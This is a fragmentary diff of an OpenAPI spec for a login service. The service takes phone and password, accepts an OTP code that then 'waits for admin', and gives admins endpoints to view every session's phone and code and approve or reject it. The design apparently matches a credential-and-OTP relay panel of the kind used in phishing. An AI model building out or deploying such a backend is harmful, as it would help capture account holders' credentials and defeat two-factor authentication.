@@ -1,0 +1,199 @@
+
+tags:
+  - name: health
+    description: Health operations
+  - name: auth
+    description: Authentication operations
+  - name: admin
+    description: Admin operations
+paths:
+  /healthz:
+    get:
+-0
++109
+            application/json:
+              schema:
+                $ref: "#/components/schemas/HealthStatus"
+  /auth/login:
+    post:
+      operationId: authLogin
+      tags: [auth]
+      summary: Submit login
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/LoginBody"
+      responses:
+        "200":
+          description: Login submitted
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/LoginResponse"
+  /auth/verify:
+    post:
+      operationId: authVerify
+      tags: [auth]
+      summary: Submit OTP code
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/VerifyBody"
+      responses:
+        "200":
+          description: Code submitted, waiting for admin
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/VerifyResponse"
+  /auth/session/{sessionId}:
+    get:
+      operationId: getSession
+      tags: [auth]
+      summary: Get session status
+      parameters:
+        - name: sessionId
+          in: path
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: Session status
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SessionStatus"
+  /admin/sessions:
+    get:
+      operationId: getAdminSessions
+      tags: [admin]
+      summary: Get all active sessions
+      responses:
+        "200":
+          description: List of sessions
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SessionsResponse"
+  /admin/sessions/{sessionId}/approve:
+    post:
+      operationId: approveSession
+      tags: [admin]
+      summary: Approve a session
+      parameters:
+        - name: sessionId
+          in: path
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: Session approved
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ActionResponse"
+  /admin/sessions/{sessionId}/reject:
+    post:
+      operationId: rejectSession
+      tags: [admin]
+      summary: Reject a session
+      parameters:
+        - name: sessionId
+          in: path
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: Session rejected
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ActionResponse"
+components:
+  schemas:
+    HealthStatus:
+-0
++80
+      required:
+        - status
+    LoginBody:
+      type: object
+      properties:
+        phone:
+          type: string
+        password:
+          type: string
+        userAgent:
+          type: string
+      required:
+        - phone
+        - password
+    LoginResponse:
+      type: object
+      properties:
+        sessionId:
+          type: string
+      required:
+        - sessionId
+    VerifyBody:
+      type: object
+      properties:
+        sessionId:
+          type: string
+        code:
+          type: string
+      required:
+        - sessionId
+        - code
+    VerifyResponse:
+      type: object
+      properties:
+        success:
+          type: boolean
+        status:
+          type: string
+      required:
+        - success
+        - status
+    SessionStatus:
+      type: object
+      properties:
+        sessionId:
+          type: string
+        status:
+          type: string
+          enum: [pending, code_submitted, approved, rejected]
+        phone:
+          type: string
+        code:
+          type: string
+        createdAt:
+          type: string
+      required:
+        - sessionId
+        - status
+        - phone
+        - createdAt
+    SessionsResponse:
+      type: object
+      properties:
+        sessions:
+          type: array
+          items:
+            $ref: "#/components/schemas/SessionStatus"
+      required:
+        - sessions
+    ActionResponse:
+      type: object
+      properties:
+        success:
+          type: boolean
+      required:
+        - success
